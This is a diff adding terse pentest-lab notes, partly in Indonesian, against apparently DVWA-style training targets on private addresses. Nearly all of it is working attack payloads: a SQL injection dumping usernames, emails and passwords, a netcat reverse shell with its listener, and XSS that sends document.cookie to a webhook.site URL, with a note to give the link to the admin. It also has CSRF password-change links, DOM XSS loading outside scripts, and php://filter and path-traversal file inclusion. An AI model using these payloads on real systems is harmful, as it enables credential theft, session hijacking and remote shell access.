@@ -6,3 +6,50 @@ http://10.10.2.49:1337/lab/sql-injection/find-password/?search=.a%27%20union%20s
 
 
 .a' union select 1,2,group_concat(username, '|',email,'|',password,'<br>'),4,5,6 from users-- -
+
+
+client
+sudo apt install ncat
+| nc 10.10.2.62 6996 -e /bin/bash
+
+
+kali linux
+ncat -l -v -p 6969
+
+
+<scipt>alert('hacked')</script>
+
+<img src/onerror=alert('hacked')>
+
+
+
+clean:
+<script>document.location='https://webhook.site/4ddd03c0-588b-4026-b1ed-d7f19193f94e?c='+document.cookie;</script>
+
+encode:
+
+%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fwebhook.site%2F4ddd03c0-588b-4026-b1ed-d7f19193f94e%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
+
+
+kasih link ini ke admin:
+http://10.10.2.61:8080/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fwebhook.site%2F4ddd03c0-588b-4026-b1ed-d7f19193f94e%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
+
+
+
+
+csrf low
+http://10.10.2.61:8080/vulnerabilities/csrf/?password_new=1234567&password_conf=1234567&Change=Change#
+
+crf medium
+http://10.10.2.61:8080/vulnerabilities/csrf/?password_new=letmein&password_conf=letmein&Change=Change#
+<img src="/vulnerabilities/csrf/?password_new=letmein1&password_conf=letmein1&Change=Change#">
+
+
+10.10.2.61:8080/vulnerabilities/xss_d/?default=English#<script src="http://127.0.0.1/test/exploit1.js"></script>
+
+10.10.2.61:8080/vulnerabilities/xss_d/?default=English#<script src="http://127.0.0.1/test/exploit2.js"></script>
+
+
+http://10.10.2.61:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../hackable/flags/fi.php
+
+http://10.10.2.61:8080/vulnerabilities/fi/?page=file/../../../hackable/uploads/bunga.png
